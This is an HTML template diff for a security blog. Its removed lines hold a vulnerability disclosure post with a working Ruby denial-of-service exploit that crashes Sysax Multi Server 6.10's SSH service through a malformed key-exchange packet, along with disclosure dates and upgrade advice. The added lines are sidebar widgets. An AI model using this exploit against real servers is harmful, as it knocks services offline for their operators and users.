@@ -91,201 +91,520 @@
 		<div style='clear: both;'></div>
 	</div>
 	
+	<div style='clear: both;'></div>
+	<div id="outer-wrapper" class="index home">
 
-<div id="main">
-  <div id="content">
-    <div>
-      <article class="hentry" role="article">
+<div class='row' id='content-wrapper'>
+    <div id='main-wrapper'>
+      <div class='main section' id='main'>
+      
+
 
         
-        
-
-        <div class="entry-content">
-          
-          
-          
-          
-
-<p>I was recently fuzzing a bunch of SSH servers, hoping to find some remote code execution in a non-mainstream server. I ended up finding no code execution in the several that I tried, but I did find one pre-auth denial of service in Syax Multi Server 6.10.</p>
-
-<!-- more -->
-
-<h2 id="try-this-at-home">Try this at home!</h2>
-
-<p>The vulnerable version can be downloaded <a href="https://www.dropbox.com/s/d6js8u6i4eioa1j/sysaxserv_setup_6.10.msi">here</a> for anyone that would like to duplicate the DoS conditions.</p>
-
-<h2 id="understanding-the-key-exchange">Understanding the Key Exchange</h2>
-
-<p>I found that during the key exchange, where the SSH client and SSH server negotiate which ciphers to use, if you messed up just a single specific byte, the server would crash. I started reading through the <a href="https://tools.ietf.org/html/rfc4253#section-7.1">RFC</a> for SSH keyexchange, and found the key exchange to be mostly ASCII.</p>
 
 
-<figure class="img-responsive">
-    
-        <img src="/img/sysax_ssh_hex.png" />
-    
-    
-</figure>
-
-
-<p>I started playing with the byte that caused the crash, and it seemed that it was some sort of control character, or separator. I&rsquo;m still unsure. However, changing it would cause a crash every time.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/sysax_ssh_hex2.png" />
-    
-    
-</figure>
-
-
-<p>I wasn&rsquo;t able to figure out any way to get remote code execution, although someone smarter than me, may be able to do it. For now, I&rsquo;ll settle with a DoS exploit.</p>
-
-<h2 id="the-exploit">The exploit</h2>
-
-<pre><code>#!/usr/bin/env ruby
-# Sysax Multi Server 6.10 SSH DoS
-# Matt &quot;hostess&quot; Andreko &lt; mandreko [at] accuvant.com &gt;
-# http://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html
-
-require 'socket'
-
-unless ARGV.length == 2
-  puts &quot;Usage: ruby #{$0} [host] [port]\n&quot;
-  exit
-end
-
-packet = [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,
-  0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,
-  0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,
-  0x00, 0x7e, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
-  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
-  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65,
-  0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,
-  0x73, 0x68, 0x61, 0x32, 0x35, 0x36, 0x2c, 0x64,
-  0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65,
-  0x6c, 0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72,
-  0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68,
-  0x61, 0x6e, 0x67, 0x65, 0x2d, 0x73, 0x68, 0x61,
-  0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
-  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
-  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x34,
-  0x2d, 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69,
-  0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c,
-  0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f,
-  0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31,
-  0x00, 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d,
-  0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d,
-  0x64, 0x73, 0x73, 0x00, 0x00, 0x00, 0x9d, 0x61,
-  0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63, 0x62,
-  0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d, 0x63,
-  0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77, 0x66,
-  0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63, 0x2c,
-  0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38, 0x2d,
-  0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63, 0x66,
-  0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c, 0x61,
-  0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32, 0x35,
-  0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f, 0x75,
-  0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39, 0x32,
-  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65, 0x73,
-  0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63, 0x2c,
-  0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65, 0x6c,
-  0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79, 0x73,
-  0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69, 0x75,
-  0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73, 0x31,
-  0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c, 0x61,
-  0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63, 0x74,
-  0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35, 0x36,
-  0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00, 0x9d,
-  0x61, 0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63,
-  0x62, 0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d,
-  0x63, 0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77,
-  0x66, 0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63,
-  0x2c, 0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38,
-  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63,
-  0x66, 0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c,
-  0x61, 0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32,
-  0x35, 0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f,
-  0x75, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39,
-  0x32, 0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65,
-  0x73, 0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63,
-  0x2c, 0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65,
-  0x6c, 0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79,
-  0x73, 0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69,
-  0x75, 0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73,
-  0x31, 0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c,
-  0x61, 0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63,
-  0x74, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35,
-  0x36, 0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00,
-  0x69, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64,
-  0x35, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
-  0x68, 0x61, 0x31, 0x2c, 0x75, 0x6d, 0x61, 0x63,
-  0x2d, 0x36, 0x34, 0x40, 0x6f, 0x70, 0x65, 0x6e,
-  0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c,
-  0x68, 0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70,
-  0x65, 0x6d, 0x64, 0x31, 0x36, 0x30, 0x2c, 0x68,
-  0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70, 0x65,
-  0x6d, 0x64, 0x31, 0x36, 0x30, 0x40, 0x6f, 0x70,
-  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
-  0x6d, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
-  0x68, 0x61, 0x31, 0x2d, 0x39, 0x36, 0x2c, 0x68,
-  0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2d,
-  0x39, 0x36, 0x00, 0x00, 0x00, 0x69, 0x68, 0x6d,
-  0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2c, 0x68,
-  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
-  0x2c, 0x75, 0x6d, 0x61, 0x63, 0x2d, 0x36, 0x34,
-  0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68,
-  0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68, 0x6d, 0x61,
-  0x63, 0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64,
-  0x31, 0x36, 0x30, 0x2c, 0x68, 0x6d, 0x61, 0x63,
-  0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64, 0x31,
-  0x36, 0x30, 0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73,
-  0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68,
-  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
-  0x2d, 0x39, 0x36, 0x2c, 0x68, 0x6d, 0x61, 0x63,
-  0x2d, 0x6d, 0x64, 0x35, 0x2d, 0x39, 0x36, 0x00,
-  #3rd byte in this next line causes crash
-  0x00, 0x00, 0x28, 0x7a, 0x6c, 0x69, 0x62, 0x40,
-  0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e,
-  0x63, 0x6f, 0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62,
-  0x2c, 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00,
-  0x1a, 0x7a, 0x6c, 0x69, 0x62, 0x40, 0x6f, 0x70,
-  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
-  0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62, 0x2c, 0x6e,
-  0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00].pack(&quot;C*&quot;)
-
-host = ARGV[0]
-port = ARGV[1]
-
-sock = TCPSocket.open(host, port)
-
-banner = sock.gets()
-puts banner
-
-sock.puts(&quot;SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1\r\n&quot;)
-sock.puts(packet)
-resp = sock.gets()
-
-sock.close()
-</code></pre>
-
-<h2 id="remediation">Remediation</h2>
-
-<p>I contacted the developers of Sysax Multi Server on March 18 2013 and April 6 2013. They were able to release a new version (6.11) which is no longer vulnerable to this bug. If you&rsquo;re running Sysax Multi Server with SSH (off by default, but plenty of users on <a href="http://www.shodanhq.com/search?q=sysax+port%3A22">ShodanHQ</a>), I would highly recommend updating to 6.11, available <a href="http://www.sysax.com/download.htm#sysaxserv">here</a>.</p>
-
-<h2 id="update">Update:</h2>
-
-<p>It looks like the Metasploit module I wrote for this has been merged! You can view it <a href="https://github.com/rapid7/metasploit-framework/blob/225342ce8f34b1af49e498c0cc6fa92c127187e8/modules/auxiliary/dos/windows/ssh/sysax_sshd_kexchange.rb">here</a></p>
-
-        </div>
-        
-      </article>
+      
+      </div>
     </div>
     
-  </div>
+    <div id='sidebar-wrapper'>
+      <div class='sidebar ready-widget section' id='sidebar'>
+        <div class='widget HTML' data-version='1' id='HTML3'>
+	<h2 class='title'>Author</h2>
+	<div class='widget-content'>
+		<div class="sidebar_about_author">
+			<div class="inner_wrapper">
+				<div class="aboutme-img">
+					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
+				</div>
+			</div>
+			<div class="aboutme-info">
+				<h4>Matt Andreko</h4>
+				<p>Security Consultant</p>
+			</div>
+		</div>
+	</div>
+	<div class='clear'></div>
 </div>
+        <div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+	<h2>Popular Articles</h2>
+	<div class='widget-content popular-posts'>
+		<ul>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>
+							<img alt='LOVE WRITING AND SHARING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>SOME BLOG POST 1</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>
+							<img alt='THE ULTIMATE CONSUMERS' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>SOME BLOG POST 2</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>
+							<img alt='IT IS BEYOND BLOGGING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>SOME BLOG POST 3</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>
+							<img alt='STARBUCKS REPRESENTS SOMETHING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>SOME BLOG POST 4</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+		</ul>
+		<div class='clear'></div>
+	</div>
+</div>
+        <div class='widget HTML' data-version='1' id='HTML2'>
+	<h2 class='title'>Featured</h2>
+	<div class='widget-content'>
+		<span class="labelpost" data-label="Magazine" data-no="4"></span>
+	</div>
+	<div class='clear'></div>
+	<span class='widget-item-control'>
+		<span class='item-control blog-admin'>
+			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
+				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+			</a>
+		</span>
+	</span>
+	<div class='clear'></div>
+</div>
+        <div class='widget Label' data-version='1' id='Label1'>
+	<h2>Categories</h2>
+	<div class='widget-content cloud-label-widget-content'>
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/antivirus'>antivirus</a>
+			</span>
 
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/aslr'>aslr</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/assembly'>assembly</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/brainpan'>brainpan</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/browsers'>browsers</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/burp'>burp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/canon'>canon</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/certification'>certification</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/commandinjection'>commandinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cookies'>cookies</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/csharp'>csharp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ctp'>ctp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cucumber'>cucumber</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/directorytraversal'>directorytraversal</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dos'>dos</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dotnet'>dotnet</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/encoding'>encoding</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exif'>exif</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit'>exploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fail'>fail</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fogbugz'>fogbugz</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/food'>food</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/formatstring'>formatstring</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fusion'>fusion</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/future'>future</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/gac'>gac</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/getoffmylawn'>getoffmylawn</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/greasemonkey'>greasemonkey</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hacking'>hacking</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/heap'>heap</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hexchat'>hexchat</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hover'>hover</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/html'>html</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/http'>http</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/includes'>includes</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/injection'>injection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/iphone'>iphone</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/kioptrix'>kioptrix</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/linux'>linux</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/metasploit'>metasploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/mips'>mips</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/monxla'>monxla</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/natas'>natas</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/nebula'>nebula</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/net'>net</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/offsec'>offsec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/oscp'>oscp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/osx'>osx</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/php'>php</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/printer'>printer</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/projects'>projects</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/protostar'>protostar</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwb'>pwb</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwcrack'>pwcrack</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rails'>rails</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rant'>rant</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2libc'>ret2libc</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2text'>ret2text</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rop'>rop</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rspec'>rspec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/security'>security</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/shellcode'>shellcode</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sprint'>sprint</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sqlinjection'>sqlinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ssh'>ssh</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/suid'>suid</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sysax'>sysax</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/tdd'>tdd</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/testing'>testing</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/til'>til</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ui'>ui</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/userscript'>userscript</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/vim'>vim</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/wargames'>wargames</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/windows'>windows</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xor'>xor</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xss'>xss</a>
+			</span>
+
+		
+		<div class='clear'></div>
+	</div>
+</div>
+      </div>
+    </div>
+    <div style='clear: both;'></div>
+  </div>
+
+
+
+
+
+		</div>
 		
 		<div id='w2t_footer'>
 			<div class='w2t-copy-container row'>
